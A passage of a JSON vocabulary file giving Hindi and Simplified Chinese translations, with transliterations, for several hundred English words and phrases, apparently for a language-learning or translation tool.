                "Hindi": "झूठ बोलना (jhooth bolna)",
                "Chinese (Simplified)": "撒谎 (sāhuǎng)"
            },
            "lied": {
                "Hindi": "झूठ बोला (jhooth bola)",
                "Chinese (Simplified)": "撒了谎 (sāle huǎng)"
            },
            "dig": {
                "Hindi": "खोदना (khodna)",
                "Chinese (Simplified)": "挖 (wā)"
            },
            "motivational": {
                "Hindi": "प्रेरणादायक (prernaadayak)",
                "Chinese (Simplified)": "励志的 (lìzhì de)"
            },
            "motivate": {
                "Hindi": "प्रेरित करना (prerit karna)",
                "Chinese (Simplified)": "激励 (jīlì)"
            },
            "singular": {
                "Hindi": "एकवचन (ekvachan)",
                "Chinese (Simplified)": "单数 (dānshù)"
            },
            "happy in life": {
                "Hindi": "जीवन में खुश (jeevan mein khush)",
                "Chinese (Simplified)": "生活幸福 (shēnghuó xìngfú)"
            },
            "sad in life": {
                "Hindi": "जीवन में उदास (jeevan mein udaas)",
                "Chinese (Simplified)": "生活悲伤 (shēnghuó bēishāng)"
            },
            "jimmy": {
                "Hindi": "जिमी (Jimmy)",
                "Chinese (Simplified)": "吉米 (Jímǐ)"
            },
            "jam": {
                "Hindi": "जाम (jam) / मुरब्बा (murabba)",
                "Chinese (Simplified)": "果酱 (guǒjiàng)"
            },
            "honey": {
                "Hindi": "शहद (shahad)",
                "Chinese (Simplified)": "蜂蜜 (fēngmì)"
            },
            "growth": {
                "Hindi": "विकास (vikas)",
                "Chinese (Simplified)": "增长 (zēngzhǎng)"
            },
            "too": {
                "Hindi": "भी (bhi)",
                "Chinese (Simplified)": "也 (yě)"
            },
            "fun fact": {
                "Hindi": "रोचक तथ्य (rochak tathya)",
                "Chinese (Simplified)": "趣闻 (qùwén)"
            },
            "fact": {
                "Hindi": "तथ्य (tathya)",
                "Chinese (Simplified)": "事实 (shìshí)"
            },
            "portfolio": {
                "Hindi": "पोर्टफोलियो (portfolio)",
                "Chinese (Simplified)": "作品集 (zuòpǐn jí)"
            },
            "firecrackers": {
                "Hindi": "पटाखे (patakhe)",
                "Chinese (Simplified)": "烟花爆竹 (yānhuā bàozhú)"
            },
            "organize": {
                "Hindi": "आयोजित करना (aayojit karna)",
                "Chinese (Simplified)": "组织 (zǔzhī)"
            },
            "organizing": {
                "Hindi": "व्यवस्थित करना (vyavasthit karna)",
                "Chinese (Simplified)": "正在组织 (zhèngzài zǔzhī)"
            },
            "organized": {
                "Hindi": "संगठित (sangathit)",
                "Chinese (Simplified)": "已组织 (yǐ zǔzhī)"
            },
            "struggle": {
                "Hindi": "संघर्ष (sangharsh)",
                "Chinese (Simplified)": "奋斗 (fèndòu)"
            },
            "annoy": {
                "Hindi": "परेशान करना (pareshaan karna)",
                "Chinese (Simplified)": "烦扰 (fánrǎo)"
            },
            "irritate": {
                "Hindi": "चिढ़ाना (chidhaana)",
                "Chinese (Simplified)": "激怒 (jīnù)"
            },
            "annoyed": {
                "Hindi": "परेशान (pareshaan)",
                "Chinese (Simplified)": "烦恼的 (fánnǎo de)"
            },
            "annoying": {
                "Hindi": "परेशान करने वाला (pareshaan karne wala)",
                "Chinese (Simplified)": "令人烦恼的 (lìngrén fánnǎo de)"
            },
            "we are": {
                "Hindi": "हम हैं (hum hain)",
                "Chinese (Simplified)": "我们是 (wǒmen shì)"
            },
            "irritated": {
                "Hindi": "चिढ़ा हुआ (chidha hua)",
                "Chinese (Simplified)": "被激怒的 (bèi jīnù de)"
            },
            "irritating": {
                "Hindi": "चिढ़ाने वाला (chidhaane wala)",
                "Chinese (Simplified)": "令人恼火的 (lìngrén nǎohuǒ de)"
            },
            "nominate": {
                "Hindi": "नामांकित करना (naamankit karna)",
                "Chinese (Simplified)": "提名 (tímíng)"
            },
            "physical health": {
                "Hindi": "शारीरिक स्वास्थ्य (sharirik swasthya)",
                "Chinese (Simplified)": "身体健康 (shēntǐ jiànkāng)"
            },
            "mental health": {
                "Hindi": "मानसिक स्वास्थ्य (maanasik swasthya)",
                "Chinese (Simplified)": "心理健康 (xīnlǐ jiànkāng)"
            },
            "yoga": {
                "Hindi": "योग (yog)",
                "Chinese (Simplified)": "瑜伽 (yújiā)"
            },
            "siu": {
                "Hindi": "सिउ (siu)",
                "Chinese (Simplified)": "咻 (xiū)"
            },
            "suit": {
                "Hindi": "सूट (suit)",
                "Chinese (Simplified)": "西装 (xīzhuāng)"
            },
            "boot": {
                "Hindi": "बूट (boot)",
                "Chinese (Simplified)": "靴子 (xuēzi)"
            },
            "sneakers": {
                "Hindi": "स्पोर्ट्स जूते (sports joote)",
                "Chinese (Simplified)": "运动鞋 (yùndòngxié)"
            },
            "skirt": {
                "Hindi": "स्कर्ट (skirt)",
                "Chinese (Simplified)": "裙子 (qúnzi)"
            },
            "shorts": {
                "Hindi": "शॉर्ट्स (shorts)",
                "Chinese (Simplified)": "短裤 (duǎnkù)"
            },
            "lose": {
                "Hindi": "हारना (haarna)",
                "Chinese (Simplified)": "失去 (shīqù)"
            },
            "paragraph": {
                "Hindi": "अनुच्छेद (anuchhed)",
                "Chinese (Simplified)": "段落 (duànluò)"
            },
            "object": {
                "Hindi": "वस्तु (vastu)",
                "Chinese (Simplified)": "物体 (wùtǐ)"
            },
            "odd": {
                "Hindi": "विषम (visham)",
                "Chinese (Simplified)": "奇数 (jīshù)"
            },
            "even": {
                "Hindi": "सम (sam)",
                "Chinese (Simplified)": "偶数 (ǒushù)"
            },
            "arrest": {
                "Hindi": "गिरफ्तारी (girftaari)",
                "Chinese (Simplified)": "逮捕 (dàibǔ)"
            },
            "correct": {
                "Hindi": "सही (sahi)",
                "Chinese (Simplified)": "正确的 (zhèngquè de)"
            },
            "biased": {
                "Hindi": "पक्षपाती (pakshpati)",
                "Chinese (Simplified)": "有偏见的 (yǒu piānjiàn de)"
            },
            "obsessed": {
                "Hindi": "मग्न (magn)",
                "Chinese (Simplified)": "痴迷的 (chīmí de)"
            },
            "hood": {
                "Hindi": "हुड (hood)",
                "Chinese (Simplified)": "兜帽 (dōumào)"
            },
            "article": {
                "Hindi": "लेख (lekh)",
                "Chinese (Simplified)": "文章 (wénzhāng)"
            },
            "track": {
                "Hindi": "पथ (path) / ट्रैक (track)",
                "Chinese (Simplified)": "轨道 (guǐdào)"
            },
            "associate": {
                "Hindi": "संबंधित करना (sambandhit karna)",
                "Chinese (Simplified)": "关联 (guānlián)"
            },
            "association": {
                "Hindi": "संगठन (sangathan)",
                "Chinese (Simplified)": "协会 (xiéhuì)"
            },
            "content": {
                "Hindi": "सामग्री (saamagri)",
                "Chinese (Simplified)": "内容 (nèiróng)"
            },
            "general": {
                "Hindi": "सामान्य (saamanya)",
                "Chinese (Simplified)": "一般的 (yībān de)"
            },
            "magazine": {
                "Hindi": "पत्रिका (patrika)",
                "Chinese (Simplified)": "杂志 (zázhì)"
            },
            "definition": {
                "Hindi": "परिभाषा (paribhaasha)",
                "Chinese (Simplified)": "定义 (dìngyì)"
            },
            "type": {
                "Hindi": "प्रकार (prakaar)",
                "Chinese (Simplified)": "类型 (lèixíng)"
            },
            "scholar": {
                "Hindi": "विद्वान (vidvaan)",
                "Chinese (Simplified)": "学者 (xuézhě)"
            },
            "grammer": {
                "Hindi": "व्याकरण (vyaakaran)",
                "Chinese (Simplified)": "语法 (yǔfǎ)"
            },
            "often": {
                "Hindi": "अक्सर (aksar)",
                "Chinese (Simplified)": "经常 (jīngcháng)"
            },
            "rare": {
                "Hindi": "दुर्लभ (durlabh)",
                "Chinese (Simplified)": "稀有的 (xīyǒu de)"
            },
            "rarely": {
                "Hindi": "कभी-कभार (kabhi-kabhaar)",
                "Chinese (Simplified)": "很少 (hěn shǎo)"
            },
            "mean": {
                "Hindi": "मतलब (matlab)",
                "Chinese (Simplified)": "意思 (yìsi)"
            },
            "meaning": {
                "Hindi": "अर्थ (arth)",
                "Chinese (Simplified)": "意义 (yìyì)"
            },
            "what does mean": {
                "Hindi": "क्या मतलब है (kya matlab hai)",
                "Chinese (Simplified)": "是什么意思 (shì shénme yìsi)"
            },
            "knew": {
                "Hindi": "पता था (pata tha)",
                "Chinese (Simplified)": "知道了 (zhīdào le)"
            },
            "typical": {
                "Hindi": "सामान्य (saamanya)",
                "Chinese (Simplified)": "典型的 (diǎnxíng de)"
            },
            "intense": {
                "Hindi": "तीव्र (teevra)",
                "Chinese (Simplified)": "强烈的 (qiángliè de)"
            },
            "vibe": {
                "Hindi": "माहौल (maahaul)",
                "Chinese (Simplified)": "氛围 (fēnwéi)"
            },
            "intention": {
                "Hindi": "इरादा (irada)",
                "Chinese (Simplified)": "意图 (yìtú)"
            },
            "intentional": {
                "Hindi": "जानबूझकर (jaanboojhkar)",
                "Chinese (Simplified)": "故意的 (gùyì de)"
            },
            "panic": {
                "Hindi": "घबराहट (ghabaraahat)",
                "Chinese (Simplified)": "恐慌 (kǒnghuāng)"
            },
            "mode": {
                "Hindi": "मोड (mode)",
                "Chinese (Simplified)": "模式 (móshì)"
            },
            "heart": {
                "Hindi": "दिल (dil)",
                "Chinese (Simplified)": "心脏 (xīnzàng)"
            },
            "heart attack": {
                "Hindi": "दिल का दौरा (dil ka daura)",
                "Chinese (Simplified)": "心脏病发作 (xīnzàng bìng fāzuò)"
            },
            "stone": {
                "Hindi": "पत्थर (patthar)",
                "Chinese (Simplified)": "石头 (shítou)"
            },
            "defending": {
                "Hindi": "रक्षा करना (raksha karna)",
                "Chinese (Simplified)": "防守 (fángshǒu)"
            },
            "defender": {
                "Hindi": "रक्षक (rakshak)",
                "Chinese (Simplified)": "防守者 (fángshǒu zhě)"
            },
            "corner": {
                "Hindi": "कोना (kona)",
                "Chinese (Simplified)": "角落 (jiǎoluò)"
            },
            "laughing": {
                "Hindi": "हंसना (hansna)",
                "Chinese (Simplified)": "笑 (xiào)"
            },
            "traveler": {
                "Hindi": "यात्री (yaatri)",
                "Chinese (Simplified)": "旅行者 (lǚxíng zhě)"
            },
            "procrastination": {
                "Hindi": "टालमटोल (taalmatol)",
                "Chinese (Simplified)": "拖延 (tuōyán)"
            },
            "speaking": {
                "Hindi": "बोलना (bolna)",
                "Chinese (Simplified)": "说话 (shuōhuà)"
            },
            "mope": {
                "Hindi": "उदास रहना (udaas rehna)",
                "Chinese (Simplified)": "闷闷不乐 (mènmèn bù lè)"
            },
            "mature": {
                "Hindi": "परिपक्व (paripakva)",
                "Chinese (Simplified)": "成熟 (chéngshú)"
            },
            "innocent": {
                "Hindi": "निर्दोष (nirdosh)",
                "Chinese (Simplified)": "无辜 (wúgū)"
            },
            "curly": {
                "Hindi": "घुंघराले (ghunghrale)",
                "Chinese (Simplified)": "卷曲的 (juǎnqū de)"
            },
            "puppet": {
                "Hindi": "कठपुतली (kathputli)",
                "Chinese (Simplified)": "木偶 (mù'ǒu)"
            },
            "doll": {
                "Hindi": "गुड़िया (gudiya)",
                "Chinese (Simplified)": "玩偶 (wán'ǒu)"
            },
            "teen": {
                "Hindi": "किशोर (kishor)",
                "Chinese (Simplified)": "青少年 (qīngshàonián)"
            },
            "load": {
                "Hindi": "भार (bhar)",
                "Chinese (Simplified)": "负载 (fùzài)"
            },
            "scout": {
                "Hindi": "जासूस (jasoos)",
                "Chinese (Simplified)": "侦察员 (zhēncháyuán)"
            },
            "fellow": {
                "Hindi": "साथी (saathi)",
                "Chinese (Simplified)": "伙伴 (huǒbàn)"
            },
            "rotten": {
                "Hindi": "सड़ा हुआ (sada hua)",
                "Chinese (Simplified)": "腐烂的 (fǔlàn de)"
            },
            "flesh": {
                "Hindi": "मांस (maans)",
                "Chinese (Simplified)": "肉 (ròu)"
            },
            "surgery": {
                "Hindi": "शल्य चिकित्सा (shalya chikitsa)",
                "Chinese (Simplified)": "手术 (shǒushù)"
            },
            "pardon": {
                "Hindi": "क्षमा (kshama)",
                "Chinese (Simplified)": "原谅 (yuánliàng)"
            },
            "courage": {
                "Hindi": "साहस (sahas)",
                "Chinese (Simplified)": "勇气 (yǒngqì)"
            },
            "coward": {
                "Hindi": "कायर (kayar)",
                "Chinese (Simplified)": "懦夫 (nuòfū)"
            },
            "cowardly": {
                "Hindi": "कायरता (kayarta)",
                "Chinese (Simplified)": "胆小的 (dǎnxiǎo de)"
            },
            "swear": {
                "Hindi": "शपथ लेना (shapath lena)",
                "Chinese (Simplified)": "发誓 (fāshì)"
            },
            "mask": {
                "Hindi": "मुखौटा (mukhauta)",
                "Chinese (Simplified)": "面具 (miànjù)"
            },
            "draft": {
                "Hindi": "प्रारूप (praaroop)",
                "Chinese (Simplified)": "草稿 (cǎogǎo)"
            },
            "listed": {
                "Hindi": "सूचीबद्ध (soochibaddh)",
                "Chinese (Simplified)": "列出的 (lièchū de)"
            },
            "unnatural": {
                "Hindi": "अप्राकृतिक (apraakritik)",
                "Chinese (Simplified)": "不自然的 (bù zìrán de)"
            },
            "dowry": {
                "Hindi": "दहेज (dahej)",
                "Chinese (Simplified)": "嫁妆 (jiàzhuāng)"
            },
            "universe": {
                "Hindi": "ब्रह्मांड (brahmaand)",
                "Chinese (Simplified)": "宇宙 (yǔzhòu)"
            },
            "multiple": {
                "Hindi": "कई (kai)",
                "Chinese (Simplified)": "多个 (duō gè)"
            },
            "unbreaking": {
                "Hindi": "अटूट (aṭūṭ)",
                "Chinese (Simplified)": "不破的 (bù pò de)"
            },
            "moron": {
                "Hindi": "मूर्ख (mūrkh)",
                "Chinese (Simplified)": "傻瓜 (shǎguā)"
            },
            "bald": {
                "Hindi": "गंजा (ganjā)",
                "Chinese (Simplified)": "秃头 (tūtóu)"
            },
            "ship": {
                "Hindi": "जहाज (jahāj)",
                "Chinese (Simplified)": "船 (chuán)"
            },
            "sip": {
                "Hindi": "घूंट (ghūnṭ)",
                "Chinese (Simplified)": "小口喝 (xiǎo kǒu hē)"
            },
            "whoop": {
                "Hindi": "जयकार (jaikār)",
                "Chinese (Simplified)": "欢呼 (huānhū)"
            },
            "martial law": {
                "Hindi": "सैन्य कानून (sainya kānūn)",
                "Chinese (Simplified)": "戒严法 (jièyán fǎ)"
            },
            "dictatorship": {
                "Hindi": "तानाशाही (tānāshāhī)",
                "Chinese (Simplified)": "独裁 (dúcái)"
            },
            "democracy": {
                "Hindi": "लोकतंत्र (loktantra)",
                "Chinese (Simplified)": "民主 (mínzhǔ)"
            },
            "heavy": {
                "Hindi": "भारी (bhārī)",
                "Chinese (Simplified)": "重的 (zhòng de)"
            },
            "issue": {
                "Hindi": "मुद्दा (mudda)",
                "Chinese (Simplified)": "问题 (wèntí)"
            },
            "around the world": {
                "Hindi": "दुनिया भर में (duniyā bhar mein)",
                "Chinese (Simplified)": "全世界 (quán shìjiè)"
            },
            "titan": {
                "Hindi": "महानायक (mahānāyak)",
                "Chinese (Simplified)": "巨人 (jùrén)"
            },
            "merge": {
                "Hindi": "विलय करना (vilay karnā)",
                "Chinese (Simplified)": "合并 (hébìng)"
            },
            "quiz": {
                "Hindi": "प्रश्नोत्तरी (prashnottarī)",
                "Chinese (Simplified)": "测验 (cèyàn)"
            },
            "strip": {
                "Hindi": "पट्टी (paṭṭī)",
                "Chinese (Simplified)": "条 (tiáo)"
            },
            "useless": {
                "Hindi": "बेकार (bekār)",
                "Chinese (Simplified)": "无用的 (wúyòng de)"
            },
            "invaders": {
                "Hindi": "आक्रमणकारी (ākramaṇkārī)",
                "Chinese (Simplified)": "侵略者 (qīnlüè zhě)"
            },
            "natives": {
                "Hindi": "स्थानीय (sthānīya)",
                "Chinese (Simplified)": "本地人 (běndì rén)"
            },
            "brutal": {
                "Hindi": "क्रूर (krūr)",
                "Chinese (Simplified)": "残忍的 (cánrěn de)"
            },
            "brutally": {
                "Hindi": "निर्दयता से (nirdayatā se)",
                "Chinese (Simplified)": "残酷地 (cánkù de)"
            },
            "long hairs": {
                "Hindi": "लंबे बाल (lambe bāl)",
                "Chinese (Simplified)": "长头发 (cháng tóufa)"
            },
            "silk": {
                "Hindi": "रेशम (resham)",
                "Chinese (Simplified)": "丝绸 (sīchóu)"
            },
            "silky": {
                "Hindi": "रेशमी (reshamī)",
                "Chinese (Simplified)": "丝滑的 (sī huá de)"
            },
            "rough": {
                "Hindi": "खुरदरा (khurdarā)",
                "Chinese (Simplified)": "粗糙的 (cūcāo de)"
            },
            "fair": {
                "Hindi": "साफ (sāf)",
                "Chinese (Simplified)": "公平的 (gōngpíng de)"
            },
            "analyze": {
                "Hindi": "विश्लेषण करना (vishleṣaṇ karnā)",
                "Chinese (Simplified)": "分析 (fēnxī)"
            },
            "disrespect": {
                "Hindi": "असम्मान (asamman)",
                "Chinese (Simplified)": "不尊重 (bù zūnzhòng)"
            },
            "estimate": {
                "Hindi": "अनुमान (anumān)",
                "Chinese (Simplified)": "估计 (gūjì)"
            },
            "fool": {
                "Hindi": "बेवकूफ (bevakūph)",
                "Chinese (Simplified)": "傻瓜 (shǎguā)"
            },
            "grateful": {
                "Hindi": "आभारी (ābhārī)",
                "Chinese (Simplified)": "感激的 (gǎnjī de)"
            },
            "ban": {
                "Hindi": "प्रतिबंध (pratibandh)",
                "Chinese (Simplified)": "禁止 (jìnzhǐ)"
            },
            "cruel": {
                "Hindi": "क्रूर (krūr)",
                "Chinese (Simplified)": "残忍的 (cánrěn de)"
            },
            "hit": {
                "Hindi": "मारना (mārnā)",
                "Chinese (Simplified)": "打 (dǎ)"
            },
            "beat": {
                "Hindi": "पीटना (pīṭnā)",
                "Chinese (Simplified)": "击打 (jīdǎ)"
            },
            "keep": {
                "Hindi": "रखना (rakhnā)",
                "Chinese (Simplified)": "保持 (bǎochí)"
            },
            "mess": {
                "Hindi": "गड़बड़ (gaḍbaḍ)",
                "Chinese (Simplified)": "混乱 (hùnluàn)"
            },
            "messing": {
                "Hindi": "गड़बड़ करना (gaḍbaḍ karnā)",
                "Chinese (Simplified)": "搞乱 (gǎo luàn)"
            },
            "act": {
                "Hindi": "कार्य (kārya)",
                "Chinese (Simplified)": "行动 (xíngdòng)"
            },
            "acting": {
                "Hindi": "अभिनय (abhinay)",
                "Chinese (Simplified)": "表演 (biǎoyǎn)"
            },
            "toast": {
                "Hindi": "टोस्ट (ṭosṭ)",
                "Chinese (Simplified)": "吐司 (tǔsī)"
            },
            "slightly": {
                "Hindi": "थोड़ा (thodā)",
                "Chinese (Simplified)": "稍微 (shāowēi)"
            },
            "whispers": {
                "Hindi": "फुसफुसाहट (fusfusāhaṭ)",
                "Chinese (Simplified)": "耳语 (ěryǔ)"
            },
            "whispered": {
                "Hindi": "फुसफुसाया (fusfusāyā)",
                "Chinese (Simplified)": "低声说 (dīshēng shuō)"
            },
            "whispering": {
                "Hindi": "फुसफुसाते हुए (fusfusāte huye)",
                "Chinese (Simplified)": "低声耳语 (dīshēng ěryǔ)"
            },
            "drink up": {
                "Hindi": "पी लो (pī lo)",
                "Chinese (Simplified)": "喝完 (hē wán)"
            },
            "cake": {
                "Hindi": "केक (kek)",
                "Chinese (Simplified)": "蛋糕 (dàngāo)"
            },
            "occasional": {
                "Hindi": "मौक़े पर (mauqe par)",
                "Chinese (Simplified)": "偶尔的 (ǒu'ěr de)"
            },
            "occasionally": {
                "Hindi": "कभी-कभी (kabhi-kabhi)",
                "Chinese (Simplified)": "偶尔 (ǒu'ěr)"
            },
            "alternate": {
                "Hindi": "वैकल्पिक (vaikalpik)",
                "Chinese (Simplified)": "交替的 (jiāotì de)"
            },
            "moan": {
                "Hindi": "कराह (karāh)",
                "Chinese (Simplified)": "呻吟 (shēnyín)"
            },
            "alternative": {
                "Hindi": "विकल्प (vikalp)",
                "Chinese (Simplified)": "替代方案 (tìdài fāng'àn)"
            },
            "invitation": {
                "Hindi": "निमंत्रण (nimantraṇ)",
                "Chinese (Simplified)": "邀请 (yāoqǐng)"
            },
            "invite": {
                "Hindi": "आमंत्रित करना (āmantrit karnā)",
                "Chinese (Simplified)": "邀请 (yāoqǐng)"
            },
            "lust": {
                "Hindi": "वासना (vāsanā)",
                "Chinese (Simplified)": "欲望 (yùwàng)"
            },
            "treat": {
                "Hindi": "इलाज करना (ilāj karnā)",
                "Chinese (Simplified)": "对待 (duìdài)"
            },
            "special treat": {
                "Hindi": "विशेष भोज (viśeṣ bhoj)",
                "Chinese (Simplified)": "特别款待 (tèbié kuǎndài)"
            },
            "bury": {
                "Hindi": "दफनाना (dafnānā)",
                "Chinese (Simplified)": "埋葬 (máizàng)"
            },
            "mushroom": {
                "Hindi": "मशरूम (mashrūm)",
                "Chinese (Simplified)": "蘑菇 (mógu)"
            },
            "cleavage": {
                "Hindi": "दरार (darār)",
                "Chinese (Simplified)": "乳沟 (rǔgōu)"
            },
            "inhale": {
                "Hindi": "साँस लेना (sāns lenā)",
                "Chinese (Simplified)": "吸气 (xīqì)"
            },
            "exhale": {
                "Hindi": "साँस छोड़ना (sāns choṛnā)",
                "Chinese (Simplified)": "呼气 (hūqì)"
            },
            "remain": {
                "Hindi": "बना रहना (banā rahanā)",
                "Chinese (Simplified)": "保持 (bǎochí)"
            },
            "remained": {
                "Hindi": "बने रहे (bane rahe)",
                "Chinese (Simplified)": "保持了 (bǎochí le)"
            },
            "remaining": {
                "Hindi": "बचे हुए (bache huye)",
                "Chinese (Simplified)": "剩下的 (shèngxià de)"
            },
            "reached": {
                "Hindi": "पहुँचा (pahunchā)",
                "Chinese (Simplified)": "到达了 (dàodá le)"
            },
            "reaching": {
                "Hindi": "पहुँचते हुए (pahunchte huye)",
                "Chinese (Simplified)": "正在到达 (zhèngzài dàodá)"
            },
            "reach": {
                "Hindi": "पहुँचना (pahunchnā)",
                "Chinese (Simplified)": "到达 (dàodá)"
            },
            "hunger": {
                "Hindi": "भूख (bhūkh)",
                "Chinese (Simplified)": "饥饿 (jī'è)"
            },
            "hungry": {
                "Hindi": "भूखा (bhūkhā)",
                "Chinese (Simplified)": "饿 (è)"
            },
            "throat": {
                "Hindi": "गला (galā)",
                "Chinese (Simplified)": "喉咙 (hóulóng)"
            },
            "thirsty": {
                "Hindi": "प्यासा (pyāsā)",
                "Chinese (Simplified)": "口渴 (kǒu kě)"
            },
            "thirst": {
                "Hindi": "प्यास (pyās)",
                "Chinese (Simplified)": "渴望 (kěwàng)"
            },
            "bring": {
                "Hindi": "लाना (lānā)",
                "Chinese (Simplified)": "带来 (dàilái)"
            },
            "bringing": {
                "Hindi": "ला रहा है (lā rahā hai)",
                "Chinese (Simplified)": "带来中 (dàilái zhōng)"
            },
            "dizzy": {
                "Hindi": "चक्कर (chakkar)",
                "Chinese (Simplified)": "头晕 (tóuyūn)"
            },
            "satisfaction": {
                "Hindi": "संतुष्टि (santuṣṭi)",
                "Chinese (Simplified)": "满足 (mǎnzú)"
            },
            "essence": {
                "Hindi": "सार (sār)",
                "Chinese (Simplified)": "本质 (běnzhì)"
            },
            "presence": {
                "Hindi": "उपस्थिति (upasthiti)",
                "Chinese (Simplified)": "存在 (cúnzài)"
            },
            "shiver": {
                "Hindi": "काँपना (kāmpnā)",
                "Chinese (Simplified)": "颤抖 (chàndǒu)"
            },
            "sense": {
                "Hindi": "अर्थ (arth)",
                "Chinese (Simplified)": "感觉 (gǎnjué)"
            },
            "moral": {
                "Hindi": "नैतिक (naitik)",
                "Chinese (Simplified)": "道德的 (dàodé de)"
            },
            "morality": {
                "Hindi": "नैतिकता (naitiktā)",
                "Chinese (Simplified)": "道德 (dàodé)"
            },
            "gentle": {
                "Hindi": "कोमल (komal)",
                "Chinese (Simplified)": "温柔的 (wēnróu de)"
            },
            "gently": {
                "Hindi": "धीरे से (dhīre se)",
                "Chinese (Simplified)": "轻轻地 (qīngqīng de)"
            },
            "murmurs": {
                "Hindi": "बड़बड़ाहट (baṛbaṛāhaṭ)",
                "Chinese (Simplified)": "低语 (dīyǔ)"
            },
            "bob": {
                "Hindi": "हिलाना (hilānā)",
                "Chinese (Simplified)": "上下摆动 (shàngxià bǎidòng)"
            },
            "bobbing": {
                "Hindi": "हिलाते हुए (hilāte huye)",
                "Chinese (Simplified)": "上下晃动 (shàngxià huàngdòng)"
            },
            "nods": {
                "Hindi": "सिर हिलाना (sir hilānā)",
                "Chinese (Simplified)": "点头 (diǎntóu)"
            },
            "embrace": {
                "Hindi": "गले लगाना (gale lagānā)",
                "Chinese (Simplified)": "拥抱 (yǒngbào)"
            },
            "impress": {
                "Hindi": "प्रभावित करना (prabhāvit karnā)",
                "Chinese (Simplified)": "留下深刻印象 (liúxià shēnkè yìnxiàng)"
            },
            "express": {
                "Hindi": "व्यक्त करना (vyakt karnā)",
                "Chinese (Simplified)": "表达 (biǎodá)"
            },
            "expressed": {
                "Hindi": "व्यक्त किया (vyakt kiyā)",
                "Chinese (Simplified)": "表达了 (biǎodále)"
            },
            "impressed": {
                "Hindi": "प्रभावित (prabhāvit)",
                "Chinese (Simplified)": "感到钦佩 (gǎndào qīnpèi)"
            },
            "expressing": {
                "Hindi": "व्यक्त करते हुए (vyakt karte huye)",
                "Chinese (Simplified)": "正在表达 (zhèngzài biǎodá)"
            },
            "impressing": {
                "Hindi": "प्रभावित करना (prabhāvit karnā)",
                "Chinese (Simplified)": "正在打动 (zhèngzài dǎdòng)"
            },
            "matters": {
                "Hindi": "मामले (māmlā)",
                "Chinese (Simplified)": "事情 (shìqíng)"
            },
            "matter": {
                "Hindi": "मामला (māmlā)",
                "Chinese (Simplified)": "重要 (zhòngyào)"
            },
            "brushing": {
                "Hindi": "ब्रश करना (braś karnā)",
                "Chinese (Simplified)": "刷 (shuā)"
            },
            "brush": {
                "Hindi": "ब्रश (braś)",
                "Chinese (Simplified)": "刷子 (shuāzi)"
            },
            "desperate": {
                "Hindi": "निराश (nirāś)",
                "Chinese (Simplified)": "绝望的 (juéwàng de)"
            },
            "each": {
                "Hindi": "प्रत्येक (pratyek)",
                "Chinese (Simplified)": "每个 (měi gè)"
            },
            "each them": {
                "Hindi": "उनमें से प्रत्येक (unmein se pratyek)",
                "Chinese (Simplified)": "他们每一个 (tāmen měi yī gè)"
            },
            "each other": {
                "Hindi": "एक दूसरे को (ek dūsre ko)",
                "Chinese (Simplified)": "彼此 (bǐcǐ)"
            },
            "itch": {
                "Hindi": "खुजली (khujlī)",
                "Chinese (Simplified)": "痒 (yǎng)"
            },
            "itched": {
                "Hindi": "खुजली की (khujlī kī)",
                "Chinese (Simplified)": "发痒了 (fāyǎng le)"
            },
            "itching": {
                "Hindi": "खुजला रहा है (khujlā rahā hai)",
                "Chinese (Simplified)": "正在发痒 (zhèngzài fāyǎng)"
            },
            "shoulder": {
                "Hindi": "कंधा (kandhā)",
                "Chinese (Simplified)": "肩膀 (jiānbǎng)"
            },
            "shoulders": {
                "Hindi": "कंधे (kandhe)",
                "Chinese (Simplified)": "双肩 (shuāng jiān)"
            },
            "soldier": {
                "Hindi": "सैनिक (sainik)",
                "Chinese (Simplified)": "士兵 (shìbīng)"
            },
            "soldiers": {
                "Hindi": "सैनिकों (sainikon)",
                "Chinese (Simplified)": "士兵们 (shìbīngmen)"
            },
            "brave": {
                "Hindi": "बहादुर (bahādur)",
                "Chinese (Simplified)": "勇敢的 (yǒnggǎn de)"
            },
            "dare": {
                "Hindi": "साहस करना (sāhas karnā)",
                "Chinese (Simplified)": "敢于 (gǎnyú)"
            },
            "roaming": {
                "Hindi": "घूमना (ghūmnā)",
                "Chinese (Simplified)": "漫游 (mànyóu)"
            },
            "pressed": {
                "Hindi": "दबाया हुआ (dabāyā huā)",
                "Chinese (Simplified)": "按下 (ànxià)"
            },
            "pressing": {
                "Hindi": "दबाते हुए (dabāte huye)",
                "Chinese (Simplified)": "按压中 (ànyā zhōng)"
            },
            "press": {
                "Hindi": "दबाना (dabānā)",
                "Chinese (Simplified)": "按 (àn)"
            },
            "shiver": {
                "Hindi": "काँपना (kāmpnā)",
                "Chinese (Simplified)": "颤抖 (chàndǒu)"
            },
            "dip": {
                "Hindi": "डुबकी (ḍubkī)",
                "Chinese (Simplified)": "浸 (jìn)"
            },
            "eye sight": {
                "Hindi": "दृष्टि (dṛṣṭi)",
                "Chinese (Simplified)": "视力 (shìlì)"
            },
            "sight": {
                "Hindi": "दृश्य (dṛśya)",
                "Chinese (Simplified)": "视线 (shìxiàn)"
            },
            "insight": {
                "Hindi": "अंतरदृष्टि (antaradṛṣṭi)",
                "Chinese (Simplified)": "洞察力 (dòngchálì)"
            },
            "lead": {
                "Hindi": "नेतृत्व करना (netṛtv karnā)",
                "Chinese (Simplified)": "领导 (lǐngdǎo)"
            },
            "leads": {
                "Hindi": "नेतृत्व करता है (netṛtv kartā hai)",
                "Chinese (Simplified)": "引导 (yǐndǎo)"
            },
            "relevant": {
                "Hindi": "संबंधित (sanbandhit)",
                "Chinese (Simplified)": "相关的 (xiāngguān de)"
            },
            "crap": {
                "Hindi": "बकवास (bakwās)",
                "Chinese (Simplified)": "废话 (fèihuà)"
            },
            "nap": {
                "Hindi": "झपकी (jhapkī)",
                "Chinese (Simplified)": "小睡 (xiǎoshuì)"
            },
            "arch": {
                "Hindi": "मेहराब (mehrāb)",
                "Chinese (Simplified)": "拱形 (gǒngxíng)"
            },
            "arc": {
                "Hindi": "धनुषाकार (dhanuṣākār)",
                "Chinese (Simplified)": "弧形 (húxíng)"
            },
            "arches": {
                "Hindi": "मेहराबें (mehrābeṃ)",
                "Chinese (Simplified)": "拱门 (gǒngmén)"
            },
            "flesh": {
                "Hindi": "मांस (māns)",
                "Chinese (Simplified)": "肉 (ròu)"
            },
            "gasps": {
                "Hindi": "हांफना (hāṅfnā)",
                "Chinese (Simplified)": "喘息 (chuǎnxī)"
            },
            "tight": {
                "Hindi": "तंग (tang)",
                "Chinese (Simplified)": "紧 (jǐn)"
            },
            "kite": {
                "Hindi": "पतंग (patang)",
                "Chinese (Simplified)": "风筝 (fēngzhēng)"
            },
            "midnight": {
                "Hindi": "आधी रात (ādhī rāt)",
